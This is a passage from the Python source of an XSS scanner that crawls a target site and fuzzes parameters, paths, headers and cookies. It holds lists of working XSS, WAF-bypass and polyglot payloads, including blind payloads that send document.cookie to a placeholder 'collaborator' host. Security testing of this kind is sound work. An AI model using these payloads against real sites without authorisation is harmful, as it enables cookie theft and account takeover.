#!/usr/bin/env python3
"""
ADVANCED XSS SCANNER - 4000+ Lines
Features:
1. URL-based scanning (no project folder needed)
2. Reflected, Stored, DOM XSS detection
3. Full AST parsing with taint analysis
4. Browser automation for dynamic analysis
5. Complete vulnerability classification
6. Advanced payload generation and testing
7. Multi-phase scanning approach
"""

import os
import re
import sys
import json
import time
import random
import socket
import hashlib
import logging
import asyncio
import argparse
import threading
import subprocess
from typing import *
from dataclasses import dataclass, field, asdict
from datetime import datetime
from urllib.parse import urlparse, urljoin, parse_qs, quote, unquote
from collections import defaultdict, deque
import html
import sqlite3
import tempfile
import inspect
from concurrent.futures import ThreadPoolExecutor, as_completed
import base64
import zlib
import pickle
from urllib.parse import urlparse, urljoin, parse_qs, quote, unquote, urlunparse

import warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings('ignore', message='Unverified HTTPS request')


# ============================================================================
# THIRD-PARTY IMPORTS WITH FALLBACKS
# ============================================================================

try:
    import requests
    from requests.adapters import HTTPAdapter
    from requests.packages.urllib3.util.retry import Retry

    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False
    print("Warning: requests module not available")

try:
    from bs4 import BeautifulSoup

    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False

try:
    import aiohttp
    import aiofiles

    AIOHTTP_AVAILABLE = True
except ImportError:
    AIOHTTP_AVAILABLE = False

try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options as ChromeOptions
    from selenium.webdriver.firefox.options import Options as FirefoxOptions

    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

try:
    import lxml.etree as ET

    LXML_AVAILABLE = True
except ImportError:
    LXML_AVAILABLE = False

try:
    import js2py

    JS2PY_AVAILABLE = True
except ImportError:
    JS2PY_AVAILABLE = False

try:
    import dukpy

    DUKPY_AVAILABLE = True
except ImportError:
    DUKPY_AVAILABLE = False

try:
    from py_mini_racer import MiniRacer

    MINIRACER_AVAILABLE = True
except ImportError:
    MINIRACER_AVAILABLE = False


# ============================================================================
# CONFIGURATION AND CONSTANTS
# ============================================================================

@dataclass
class ScannerConfig:
    """Complete scanner configuration"""
    # Scanning modes
    scan_types: List[str] = field(default_factory=lambda: ['reflected', 'stored', 'dom', 'blind'])
    max_depth: int = 3
    max_pages: int = 50
    max_concurrent: int = 10
    timeout: int = 30
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

    # Payload configurations
    test_payloads: bool = True
    payload_count: int = 50
    fuzz_parameters: bool = True
    fuzz_headers: bool = True
    fuzz_cookies: bool = True

    # Advanced options
    use_selenium: bool = True
    use_headless: bool = True
    use_proxy: str = None
    follow_redirects: bool = True
    verify_ssl: bool = True #False edited

    # Detection settings
    detect_waf: bool = True
    detect_frameworks: bool = True
    fingerprint_tech: bool = True

    # Performance
    request_delay: float = 0.5
    max_retries: int = 3

    # Output
    output_format: str = "json"
    verbose: bool = False
    debug: bool = False


class XSSPayloads:
    """Comprehensive XSS payload database"""

    # Basic payloads
    BASIC = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<body onload=alert(1)>',
        '<iframe src="javascript:alert(1)">',
        '<a href="javascript:alert(1)">click</a>',
        '<details open ontoggle=alert(1)>',
        '<video><source onerror=alert(1)>',
        '<audio src=x onerror=alert(1)>',
        '<form><button formaction=javascript:alert(1)>',
    ]

    # Advanced evasion payloads
    EVASION = [
        '<scr<script>ipt>alert(1)</scr</script>ipt>',
        '<img src=x oneonerrorrror=alert(1)>',
        '<svg/onload=alert(1)>',
        '<img src=x onerror="alert`1`">',
        '<img src=x onerror=alert.call(null,1)>',
        '<img src=x onerror=alert.bind(null)(1)>',
        '<img src=x onerror=(alert)(1)>',
        '<img src=x onerror=alert(1) //',
        '<img src=x oneonerrorrror=alert(1)//',
        '<img src=x onerror=eval("alert\\x281\\x29")>',
        '<img src=x onerror=eval("alert\x281\x29")>',
    ]

    # DOM-based payloads
    DOM = [
        "'-alert(1)-'",
        '"-alert(1)-"',
        '`${alert(1)}`',
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        'javascript:alert(document.domain)',
        'javascript:alert(window.name)',
        'javascript:eval(atob("YWxlcnQoMSk="))',
        'javascript:location=alert(1)',
        'javascript://%0aalert(1)',
    ]

    # Blind XSS payloads
    BLIND = [
        '<script>fetch("http://collaborator/"+document.cookie)</script>',
        '<img src=x onerror="new Image().src=\'http://collaborator/?\'+btoa(document.cookie)">',
        '<script>new Image().src="http://collaborator/?"+document.domain</script>',
        '<iframe src="http://collaborator"></iframe>',
        '<link rel=ping href="http://collaborator">',
        '<script>navigator.sendBeacon("http://collaborator", document.cookie)</script>',
    ]

    # Polyglot payloads (work in multiple contexts)
    POLYGLOT = [
        'jaVasCript:/*-/*`/*\\`/*\\\'/*"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e',

        '\'">><marquee><img src=x onerror=confirm(1)></marquee>">',

        '</plaintext\\></|\\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(1) type=submit>',

        '-->\'"/></sCript><svG x=">" onload=(co\\u006efirm)``>',

        'javascript://%250aalert(1)',
    ]

    # Framework-specific payloads
    ANGULAR = [
        '{{constructor.constructor("alert(1)")()}}',
        '{{$eval.constructor("alert(1)")()}}',
        '{{a="constructor";b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].__proto__,a).value,0,"alert(1)")()}}',
    ]

    REACT = [
        '<img src={alert(1)}>',
        '<div dangerouslySetInnerHTML={{__html: "<img src=x onerror=alert(1)>"}}></div>',
    ]

    VUE = [
        '{{_c.constructor("alert(1)")()}}',
        '<div v-html="<img src=x onerror=alert(1)>"></div>',
    ]

    # WAF bypass payloads
    WAF_BYPASS = [
        '<script>prompt`1`</script>',
        '<script>confirm`1`</script>',
        '<script>print`1`</script>',
        '<img src=x onerror="window[\'ale\'+\'rt\'](window[\'doc\'+\'ument\'][\'dom\'+\'ain\'])">'
        '<svg><script>alert&#40;1&#41</script>',
        '<<script>alert(1);//<</script>',
        '<img src=x oneonerrorrror=alert(1)>',
        '<iframe srcdoc="<script>alert(1)</script>">',
        '<math><mi//xlink:href="data:x,<script>alert(1)</script>">',
        '<marquee><img src=x onerror=alert(1)></marquee>',
    ]


# ============================================================================
# CORE DATA STRUCTURES
# ============================================================================

@dataclass
class Vulnerability:
    """Complete vulnerability representation"""
    id: str
    type: str  # reflected, stored, dom, blind, etc.
    url: str
    method: str
    parameter: str = None
    payload: str = None
    context: Dict[str, Any] = field(default_factory=dict)
    confidence: float = 0.0
    severity: str = "medium"
    evidence: str = None
    http_request: str = None
    http_response: str = None
    location: str = None  # Where in response payload appears
    cwe: List[str] = field(default_factory=lambda: ["CWE-79"])
    cvss_score: float = 0.0
    tags: List[str] = field(default_factory=list)
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())

    def to_dict(self):
        result = asdict(self)
        result['cvss_vector'] = self.get_cvss_vector()
        return result

    def get_cvss_vector(self):
        if self.severity == "critical":
            return "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
        elif self.severity == "high":
            return "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N"
        elif self.severity == "medium":
            return "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N"
        else:
            return "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N"


@dataclass
class PageInfo:
    """Information about a scanned page"""
    url: str
    status_code: int
    content_type: str
    content_length: int
    title: str = None
    forms: List[Dict] = field(default_factory=list)
    inputs: List[Dict] = field(default_factory=list)
    links: List[str] = field(default_factory=list)
    scripts: List[str] = field(default_factory=list)
    cookies: Dict[str, str] = field(default_factory=dict)
    headers: Dict[str, str] = field(default_factory=dict)
    technologies: List[str] = field(default_factory=list)
    dom_elements: Dict[str, List] = field(default_factory=dict)
    javascript_analysis: Dict[str, Any] = field(default_factory=dict)
    screenshot_path: str = None


@dataclass
class ScanResult:
    """Complete scan result"""
    scan_id: str
    target_url: str
    start_time: str
    end_time: str = None
    duration: float = 0.0
    pages_scanned: int = 0
    requests_made: int = 0
    vulnerabilities_found: int = 0
    vulnerabilities: List[Vulnerability] = field(default_factory=list)
    pages: List[PageInfo] = field(default_factory=list)
    statistics: Dict[str, Any] = field(default_factory=dict)
    waf_detected: bool = False
    waf_type: str = None
    tech_stack: List[str] = field(default_factory=list)
    config: Dict[str, Any] = field(default_factory=dict)


# ============================================================================
# ADVANCED HTTP CLIENT
# ============================================================================

class AdvancedHTTPClient:
    """Advanced HTTP client with retries, proxy, and fingerprinting"""

    def __init__(self, config: ScannerConfig):
        self.config = config
        self.session = None
        self.cookies = {}
        self.headers = {
            'User-Agent': config.user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }
        self.init_session()

    def init_session(self):
        """Initialize requests session with advanced settings"""
        if not REQUESTS_AVAILABLE:
            raise ImportError("requests module is required")

        self.session = requests.Session()

        # Configure retries
        retry_strategy = Retry(
            total=self.config.max_retries,
            backoff_factor=0.5,
            status_forcelist=[429, 500, 502, 503, 504]
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)

        # Configure proxy
        if self.config.use_proxy:
            self.session.proxies = {
                'http': self.config.use_proxy,
                'https': self.config.use_proxy
            }

        # Update headers
        self.session.headers.update(self.headers)

    def request(self, method: str, url: str, **kwargs) -> requests.Response:
        """Make HTTP request with advanced features"""
        if not self.session:
            self.init_session()

        parsed_url = urlparse(url)
        is_localhost = parsed_url.hostname in ['localhost', '127.0.0.1', '0.0.0.0']

        # Auto-detect: verify SSL for public domains, don't verify for localhost
        if 'verify' not in kwargs:
            if is_localhost:
                kwargs['verify'] = False
            else:
                kwargs['verify'] = self.config.verify_ssl

        # Add default kwargs
        kwargs.setdefault('timeout', self.config.timeout)
        kwargs.setdefault('allow_redirects', self.config.follow_redirects)
        #kwargs.setdefault('verify', self.config.verify_ssl)

        # Add delay if configured
        if self.config.request_delay > 0:
            time.sleep(self.config.request_delay)

        try:
            response = self.session.request(method, url, **kwargs)
            return response
        except requests.exceptions.RequestException as e:
            logging.error(f"Request failed for {url}: {e}")
            raise

    def get(self, url: str, **kwargs) -> requests.Response:
        return self.request('GET', url, **kwargs)

    def post(self, url: str, data=None, **kwargs) -> requests.Response:
        return self.request('POST', url, data=data, **kwargs)

    def put(self, url: str, data=None, **kwargs) -> requests.Response:
        return self.request('PUT', url, data=data, **kwargs)

    def delete(self, url: str, **kwargs) -> requests.Response:
        return self.request('DELETE', url, **kwargs)

    def head(self, url: str, **kwargs) -> requests.Response:
        return self.request('HEAD', url, **kwargs)

    def options(self, url: str, **kwargs) -> requests.Response:
        return self.request('OPTIONS', url, **kwargs)


# ============================================================================
# WEB CRAWLER
# ============================================================================

class WebCrawler:
    """Advanced web crawler for URL discovery - ONLY crawls same domain and subdomains"""

    def __init__(self, http_client: AdvancedHTTPClient, config: ScannerConfig):
        self.client = http_client
        self.config = config
        self.visited = set()
        self.to_visit = deque()
        self.discovered_pages = []
        self.lock = threading.Lock()
        self.base_domain = None

    def crawl(self, start_url: str) -> List[PageInfo]:
        """Crawl website starting from given URL with depth limitation"""
        # Store base domain for filtering
        self.base_domain = self._extract_base_domain(start_url)
        if not self.base_domain:
            logging.error(f"Invalid start URL: {start_url}")
            return []

        logging.info(f"Crawler: Restricting to domain: {self.base_domain}, Max depth: {self.config.max_depth}")

        if self.config.max_depth == 0:
            logging.info("Depth 0 specified - only scanning provided URL")
            page_info = self.crawl_page(start_url)
            return [page_info] if page_info else []

        # Use deque with depth tracking: (url, depth)
        self.to_visit = deque([(start_url, 0)])
        self.visited = set()
        self.discovered_pages = []

        while self.to_visit and len(self.visited) < self.config.max_pages:
            batch_size = min(len(self.to_visit), self.config.max_concurrent)
            current_batch = []

            # Get batch of URLs to process with their depths
            for _ in range(batch_size):
                if self.to_visit:
                    current_batch.append(self.to_visit.popleft())

            # Process batch concurrently
            with ThreadPoolExecutor(max_workers=self.config.max_concurrent) as executor:
                futures = []

                for url, depth in current_batch:
                    if url in self.visited:
                        continue

                    # Filter URLs BEFORE processing
                    if not self._is_same_domain(url):
                        logging.debug(f"Skipping external URL: {url}")
                        continue

                    self.visited.add(url)
                    future = executor.submit(self.crawl_page_with_depth, url, depth)
                    futures.append((future, url, depth))

                # Wait for all futures and collect results
                for future, url, depth in futures:
                    try:
                        page_info = future.result(timeout=self.config.timeout)
                        if page_info:
                            self.discovered_pages.append(page_info)

                            # Add new links to the queue for NEXT iteration if depth allows
                            if (len(self.visited) < self.config.max_pages and
                                    depth < self.config.max_depth - 1):  # depth is 0-based

                                for link in page_info.links:
                                    if (link not in self.visited and
                                            not any(link == item[0] for item in self.to_visit) and
                                            self._should_crawl_link(link)):
                                        self.to_visit.append((link, depth + 1))

                    except Exception as e:
                        logging.error(f"Crawl error for {url}: {e}")

        logging.info(f"Crawler finished: Found {len(self.discovered_pages)} pages within depth {self.config.max_depth}")
        return self.discovered_pages

    def crawl_page_with_depth(self, url: str, depth: int) -> Optional[PageInfo]:
        """Crawl a single page with depth info"""
        try:
            # Double-check domain before crawling
            if not self._is_same_domain(url):
                logging.debug(f"Skipping external domain at depth {depth}: {url}")
                return None

            logging.debug(f"Crawling depth {depth}: {url}")
            response = self.client.get(url)
            page_info = self.analyze_page(url, response)

            # Filter links immediately after extraction
            filtered_links = []
            for link in page_info.links:
                if self._should_crawl_link(link):
                    filtered_links.append(link)
                else:
                    logging.debug(f"Filtered out link: {link}")

            # Replace with filtered links
            page_info.links = filtered_links

            return page_info

        except Exception as e:
            logging.error(f"Failed to crawl {url}: {e}")
            return None

    def _extract_base_domain(self, url: str) -> str:
        """Extract base domain from URL (e.g., example.com from sub.example.com)"""
        try:
            parsed = urlparse(url)
            if not parsed.netloc:
                return None

            # Remove port if present
            domain = parsed.netloc.split(':')[0]

            # For IP addresses, return as-is
            if re.match(r'\d+\.\d+\.\d+\.\d+', domain):
                return domain

            # For localhost, return as-is
            if domain == 'localhost':
                return domain

            # Extract base domain (last two parts for regular domains)
            parts = domain.split('.')
            if len(parts) >= 2:
                # Handle exceptions like .co.uk, .com.au
                if len(parts) > 2 and parts[-2] in ['co', 'com', 'org', 'net', 'gov', 'edu']:
                    return '.'.join(parts[-3:])
                return '.'.join(parts[-2:])
            return domain

        except Exception:
            return None

    def _is_same_domain(self, url: str) -> bool:
        """Check if URL belongs to same domain or subdomain"""
        if not self.base_domain:
            return True  # If no base domain set, allow all (shouldn't happen)

        try:
            parsed = urlparse(url)
            if not parsed.netloc:
                return False

            domain = parsed.netloc.split(':')[0]

            # Check for exact match or subdomain
            if domain == self.base_domain:
                return True

            # Check for subdomain (e.g., sub.example.com matches example.com)
            if domain.endswith('.' + self.base_domain):
                return True

            # Special case: localhost and 127.0.0.1
            if self.base_domain in ['localhost', '127.0.0.1']:
                return domain in ['localhost', '127.0.0.1', '0.0.0.0']

            return False

        except Exception:
            return False

    def _should_crawl_link(self, link: str) -> bool:
        """Determine if a link should be crawled"""
        # First check if it's the same domain
        if not self._is_same_domain(link):
            return False

        try:
            # Skip common static files
            static_extensions = [
                '.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.ico', '.svg',
                '.woff', '.woff2', '.ttf', '.eot', '.mp4', '.mp3', '.avi', '.mov',
                '.pdf', '.zip', '.tar', '.gz', '.rar', '.exe', '.dmg', '.pkg',
                '.json', '.xml', '.csv', '.txt', '.log'
            ]

            # Parse the URL to get the path
            parsed = urlparse(link)
            path = parsed.path.lower()

            # Check file extensions
            if any(path.endswith(ext) for ext in static_extensions):
                return False

            # Skip non-HTTP/HTTPS protocols
            if parsed.scheme not in ['http', 'https', '']:
                return False

            # Skip common non-page URLs
            skip_patterns = [
                'javascript:', 'mailto:', 'tel:', 'sms:', 'data:',
                'ftp:', 'ssh:', 'file:', 'blob:', 'about:'
            ]
            if any(link.lower().startswith(pattern) for pattern in skip_patterns):
                return False

            # Skip URLs with fragments only
            if link.startswith('#'):
                return False

            # Skip URLs that are obviously payloads (like collaborator)
            payload_indicators = ['collaborator', 'burpcollaborator', 'interactsh']
            if any(indicator in link.lower() for indicator in payload_indicators):
                return False

            return True

        except Exception as e:
            logging.debug(f"Link validation failed for {link}: {e}")
            return False

    def crawl_page(self, url: str) -> Optional[PageInfo]:
        """Crawl a single page"""
        try:
            # Double-check domain before crawling
            if not self._is_same_domain(url):
                logging.debug(f"Skipping external domain in crawl_page: {url}")
                return None

            response = self.client.get(url)
            page_info = self.analyze_page(url, response)

            # Filter links immediately after extraction
            filtered_links = []
            for link in page_info.links:
                if self._should_crawl_link(link):
                    filtered_links.append(link)
                else:
                    logging.debug(f"Filtered out link: {link}")

            # Replace with filtered links
            page_info.links = filtered_links

            return page_info

        except Exception as e:
            logging.error(f"Failed to crawl {url}: {e}")
            return None

    def extract_links(self, html_content: str, base_url: str) -> List[str]:
        """Extract all links from HTML with immediate filtering"""
        if not BS4_AVAILABLE:
            return []

        soup = BeautifulSoup(html_content, 'html.parser')
        links = []

        # Define tags and their attributes that contain URLs
        tag_attributes = [
            ('a', 'href'),
            ('link', 'href'),
            ('img', 'src'),
            ('script', 'src'),
            ('iframe', 'src'),
            ('frame', 'src'),
            ('form', 'action'),
            ('area', 'href'),
            ('base', 'href'),
            ('embed', 'src'),
            ('source', 'src'),
            ('track', 'src'),
            ('object', 'data')
        ]

        for tag_name, attr in tag_attributes:
            for tag in soup.find_all(tag_name, {attr: True}):
                url = tag[attr]

                # Skip empty URLs
                if not url or url.strip() == '':
                    continue

                # Skip anchors and JavaScript
                if url.startswith(('#', 'javascript:', 'mailto:', 'tel:', 'data:')):
                    continue

                # Make absolute URL
                try:
                    absolute_url = urljoin(base_url, url)

                    # Filter immediately based on domain
                    if self.base_domain and not self._is_same_domain(absolute_url):
                        continue

                    # Add to links
                    links.append(absolute_url)

                except Exception as e:
                    logging.debug(f"Failed to process URL {url}: {e}")
                    continue

        # Remove duplicates
        unique_links = list(set(links))

        # Debug logging
        if unique_links:
            logging.debug(f"Extracted {len(unique_links)} links from {base_url}")
            if len(unique_links) <= 5:
                for link in unique_links:
                    logging.debug(f"  - {link}")

        return unique_links

    def analyze_page(self, url: str, response: requests.Response) -> PageInfo:
        """Analyze page content and extract information"""
        soup = None
        if BS4_AVAILABLE:
            soup = BeautifulSoup(response.text, 'html.parser')

        # Extract forms
        forms = self.extract_forms(response.text) if soup else []

        # Extract inputs
        inputs = self.extract_inputs(response.text) if soup else []

        # Extract scripts
        scripts = self.extract_scripts(response.text) if soup else []

        # Extract links (already filtered by extract_links)
        links = self.extract_links(response.text, url)

        # Extract title
        title = None
        if soup and soup.title:
            title = soup.title.string

        return PageInfo(
            url=url,
            status_code=response.status_code,
            content_type=response.headers.get('Content-Type', ''),
            content_length=len(response.content),
            title=title,
            forms=forms,
            inputs=inputs,
            links=links,
            scripts=scripts,
            cookies=dict(response.cookies),
            headers=dict(response.headers)
        )

    def extract_forms(self, html_content: str) -> List[Dict]:
        """Extract forms from HTML"""
        if not BS4_AVAILABLE:
            return []

        soup = BeautifulSoup(html_content, 'html.parser')
        forms = []

        for form in soup.find_all('form'):
            form_data = {
                'action': form.get('action', ''),
                'method': form.get('method', 'GET').upper(),
                'inputs': []
            }

            # Extract form inputs
            for input_tag in form.find_all(['input', 'textarea', 'select']):
                input_data = {
                    'type': input_tag.get('type', 'text'),
                    'name': input_tag.get('name', ''),
                    'value': input_tag.get('value', ''),
                    'id': input_tag.get('id', ''),
                    'class': input_tag.get('class', [])
                }
                form_data['inputs'].append(input_data)

            forms.append(form_data)

        return forms

    def extract_inputs(self, html_content: str) -> List[Dict]:
        """Extract all input fields from HTML"""
        if not BS4_AVAILABLE:
            return []

        soup = BeautifulSoup(html_content, 'html.parser')
        inputs = []

        for tag in soup.find_all(['input', 'textarea', 'select']):
            input_data = {
                'tag': tag.name,
                'type': tag.get('type', 'text'),
                'name': tag.get('name', ''),
                'value': tag.get('value', ''),
                'id': tag.get('id', ''),
                'class': tag.get('class', []),
                'attributes': dict(tag.attrs)
            }
            inputs.append(input_data)

        return inputs

    def extract_scripts(self, html_content: str) -> List[str]:
        """Extract JavaScript sources"""
        if not BS4_AVAILABLE:
            return []

        soup = BeautifulSoup(html_content, 'html.parser')
        scripts = []

        for script in soup.find_all('script'):
            if script.get('src'):
                scripts.append(script['src'])
            elif script.string:
                scripts.append(f"inline:{hashlib.md5(script.string.encode()).hexdigest()[:8]}")

        return scripts


# ============================================================================
# ADVANCED XSS DETECTION ENGINE
# ============================================================================

class XSSDetectionEngine:
    """Main XSS detection engine with multiple detection methods"""

    def __init__(self, config: ScannerConfig):
        self.config = config
        self.payload_generator = XSSPayloadGenerator()
        self.detectors = {
            'reflected': ReflectedXSSDetector(config),
            'stored': StoredXSSDetector(config),
            'dom': DOMXSSDetector(config),
            'blind': BlindXSSDetector(config)
        }
        self.fingerprinter = TechnologyFingerprinter()
        self.waf_detector = WAFDetector()

    def analyze_url(self, url: str, http_client: AdvancedHTTPClient) -> List[Vulnerability]:
        """Analyze a single URL for XSS vulnerabilities"""
        vulnerabilities = []

        try:
            # First, fingerprint the target
            tech_info = self.fingerprinter.fingerprint(url, http_client)

            # Check for WAF
            waf_info = self.waf_detector.detect(url, http_client)

            # Test for reflected XSS
            if 'reflected' in self.config.scan_types:
                reflected_vulns = self.detectors['reflected'].test(url, http_client, self.payload_generator)
                vulnerabilities.extend(reflected_vulns)

            # Test for DOM XSS (requires JavaScript analysis)
            if 'dom' in self.config.scan_types and SELENIUM_AVAILABLE:
                dom_vulns = self.detectors['dom'].test(url, http_client, self.payload_generator)
                vulnerabilities.extend(dom_vulns)

            # Test for stored XSS (requires form submission)
            if 'stored' in self.config.scan_types:
                # First crawl to find forms
                crawler = WebCrawler(http_client, ScannerConfig(max_pages=10))
                pages = crawler.crawl(url)

                for page in pages:
                    for form in page.forms:
                        stored_vulns = self.detectors['stored'].test_form(
                            page.url, form, http_client, self.payload_generator
                        )
                        vulnerabilities.extend(stored_vulns)

            # Add context to vulnerabilities
            for vuln in vulnerabilities:
                vuln.context.update({
                    'technologies': tech_info,
                    'waf_detected': waf_info['detected'],
                    'waf_type': waf_info['type']
                })

        except Exception as e:
            logging.error(f"Analysis failed for {url}: {e}")

        return vulnerabilities


class ReflectedXSSDetector:
    """Detect reflected XSS vulnerabilities"""

    def __init__(self, config: ScannerConfig = None):
        self.config = config or ScannerConfig()

    def test(self, url: str, http_client: AdvancedHTTPClient,
             payload_generator: 'XSSPayloadGenerator') -> List[Vulnerability]:
        """Test URL for reflected XSS"""
        vulnerabilities = []

        # Parse URL to get parameters
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        # Test each parameter
        for param_name in params.keys():
            param_vulns = self.test_parameter(
                url, param_name, http_client, payload_generator
            )
            vulnerabilities.extend(param_vulns)

        # Test URL path
        path_vulns = self.test_path(url, http_client, payload_generator)
        vulnerabilities.extend(path_vulns)

        # Test headers
        if self.config.fuzz_headers:
            header_vulns = self.test_headers(url, http_client, payload_generator)
            vulnerabilities.extend(header_vulns)

        # Test cookies
        if self.config.fuzz_cookies:
            cookie_vulns = self.test_cookies(url, http_client, payload_generator)
            vulnerabilities.extend(cookie_vulns)

        return vulnerabilities

    def test_parameter(self, url: str, param_name: str,
                       http_client: AdvancedHTTPClient,
                       payload_generator: 'XSSPayloadGenerator') -> List[Vulnerability]:
        """Test a specific parameter for XSS"""
        vulnerabilities = []
        payloads = payload_generator.get_reflected_payloads()

        for payload in payloads[:self.config.payload_count]:
            try:
                # Parse URL
                parsed = urlparse(url)

                # Check if payload contains javascript: protocol - skip these for GET requests
                if payload.lower().startswith(('javascript:', 'data:')):
                    # These payloads are for DOM XSS, not reflected GET parameters
                    continue


                # Prepare test URL with payload
                params = parse_qs(parsed.query)

                # Clean the payload for URL inclusion
                clean_payload = payload
                # Remove problematic characters that break URL parsing
                if clean_payload.startswith('javascript:'):
                    # Encode the entire javascript: payload
                    clean_payload = quote(clean_payload, safe='')
                elif any(c in clean_payload for c in ['\n', '\r', '\t']):
                    # Encode control characters
                    clean_payload = quote(clean_payload)

                params[param_name] = [clean_payload]

                # Reconstruct URL
                new_query = '&'.join([f"{k}={quote(v[0], safe='')}" for k, v in params.items()])

                # Rebuild URL properly
                test_url = urlunparse((
                    parsed.scheme,
                    parsed.netloc,
                    parsed.path,
                    parsed.params,
                    new_query,
                    parsed.fragment
                ))
                if not self.is_valid_test_url(test_url):
                    logging.debug(f"Skipping invalid test URL: {test_url[:100]}...")
                    continue

                # Make request
                response = http_client.get(test_url)

                # Check if payload is reflected
                if self.is_payload_reflected(payload, response.text):
                    # Verify XSS
                    if self.verify_xss(test_url, payload, http_client):
                        vuln = self.create_vulnerability(
                            url=test_url,
                            param=param_name,
                            payload=payload,
                            response=response,
                            vuln_type="reflected"
                        )
                        vulnerabilities.append(vuln)

            except Exception as e:
                logging.debug(f"Parameter test failed for {param_name}: {e}")

        return vulnerabilities

    def test_path(self, url: str, http_client: AdvancedHTTPClient,
                  payload_generator: 'XSSPayloadGenerator') -> List[Vulnerability]:
        """Test URL path for XSS (e.g., /path/<payload>)"""
        vulnerabilities = []
        payloads = payload_generator.get_reflected_payloads()

        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        for payload in payloads[:min(10, self.config.payload_count)]:
            try:
                # Create test URL with payload in path
                # Remove any existing path and add payload
                test_path = f"/{payload}"
                test_url = f"{base_url}{test_path}"

                response = http_client.get(test_url)

                if self.is_payload_reflected(payload, response.text):
                    if self.verify_xss(test_url, payload, http_client):
                        vuln = Vulnerability(
                            id=hashlib.md5(f"path:{test_url}".encode()).hexdigest()[:16],
                            type="reflected",
                            url=test_url,
                            method="GET",
                            parameter="path",
                            payload=payload,
                            evidence="Payload reflected in path",
                            confidence=0.7,
                            severity="high" if "<script>" in payload else "medium",
                            location="response_body"
                        )
                        vulnerabilities.append(vuln)

            except Exception as e:
                logging.debug(f"Path test failed: {e}")

        return vulnerabilities

    def test_headers(self, url: str, http_client: AdvancedHTTPClient,
                     payload_generator: 'XSSPayloadGenerator') -> List[Vulnerability]:
        """Test HTTP headers for XSS"""
        vulnerabilities = []
        payloads = payload_generator.get_reflected_payloads()

        headers_to_test = [
            'User-Agent',
            'Referer',
            'X-Forwarded-For',
            'X-Real-IP',
            'Origin',
            'X-Requested-With'
        ]

        for header in headers_to_test:
            for payload in payloads[:min(5, self.config.payload_count)]:
                try:
                    custom_headers = {header: payload}
                    response = http_client.get(url, headers=custom_headers)

                    if self.is_payload_reflected(payload, response.text):
                        if self.verify_xss(url, payload, http_client):
                            vuln = Vulnerability(
                                id=hashlib.md5(f"header:{url}:{header}".encode()).hexdigest()[:16],
                                type="reflected",
                                url=url,
                                method="GET",
                                parameter=f"header:{header}",
                                payload=payload,
                                evidence=f"Payload reflected via {header} header",
                                confidence=0.6,
                                severity="medium",
                                location="response_body"
                            )
                            vulnerabilities.append(vuln)

                except Exception as e:
                    logging.debug(f"Header test failed for {header}: {e}")

        return vulnerabilities

    def test_cookies(self, url: str, http_client: AdvancedHTTPClient,
                     payload_generator: 'XSSPayloadGenerator') -> List[Vulnerability]:
        """Test cookies for XSS"""
        vulnerabilities = []
        payloads = payload_generator.get_reflected_payloads()

        cookie_names = ['test_cookie', 'session', 'auth', 'token']

        for cookie_name in cookie_names:
            for payload in payloads[:min(5, self.config.payload_count)]:
                try:
                    # Set cookie
                    http_client.session.cookies.set(cookie_name, payload)
                    response = http_client.get(url)

                    if self.is_payload_reflected(payload, response.text):
                        if self.verify_xss(url, payload, http_client):
                            vuln = Vulnerability(
                                id=hashlib.md5(f"cookie:{url}:{cookie_name}".encode()).hexdigest()[:16],
                                type="reflected",
                                url=url,
                                method="GET",
                                parameter=f"cookie:{cookie_name}",
                                payload=payload,
                                evidence=f"Payload reflected via {cookie_name} cookie",
                                confidence=0.6,
                                severity="medium",
                                location="response_body"
                            )
                            vulnerabilities.append(vuln)

                except Exception as e:
                    logging.debug(f"Cookie test failed for {cookie_name}: {e}")

        return vulnerabilities

    def test_json(self, url: str, http_client: AdvancedHTTPClient,
                  payload_generator: 'XSSPayloadGenerator') -> List[Vulnerability]:
        """Test JSON parameters for XSS"""
        vulnerabilities = []
        payloads = payload_generator.get_reflected_payloads()

        # Test common JSON endpoints
        json_endpoints = [
            f"{url}/api/search",
            f"{url}/api/query",
            f"{url}/api/filter",
            f"{url}/search",
            f"{url}/query"
        ]

        for endpoint in json_endpoints:
            for payload in payloads[:min(10, self.config.payload_count)]:
                try:
                    json_data = {
                        "q": payload,
                        "search": payload,
                        "query": payload,
                        "filter": payload,
                        "input": payload
                    }

                    response = http_client.post(endpoint, json=json_data)

                    if self.is_payload_reflected(payload, response.text):
                        if self.verify_xss(endpoint, payload, http_client):
                            vuln = Vulnerability(
                                id=hashlib.md5(f"json:{endpoint}".encode()).hexdigest()[:16],
                                type="reflected",
                                url=endpoint,
                                method="POST",
                                parameter="JSON body",
                                payload=payload,
